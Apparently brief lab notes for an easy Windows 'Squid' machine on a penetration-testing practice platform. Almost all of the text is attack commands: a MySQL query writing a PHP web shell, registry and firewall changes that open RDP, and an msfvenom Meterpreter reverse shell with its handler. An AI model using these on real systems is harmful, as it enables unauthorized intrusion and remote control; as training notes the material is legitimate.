Title : Squid Machine
Date  : 2024-05-19 19:10 
Category : HTB
Slug : squid


# SQUID - MACHINE / PG
#PG/easy_windows

This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128


#### Mysql 3306:

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

#### Disable NLA;
```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
```

#### Enable RDP on owned machine:
```shell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

```

```shell
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

```
 
#### Reverse Shell with Meterpreter:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=4444 --format=exe > evil.exe

```

```shell
msf5> use exploit/multi/handler
msf5> set payload windows/meterpreter/reverse_tcp
msf5> set LHOST 192.168.0.17
msf5> set LPORT 4444
msf5> run
```
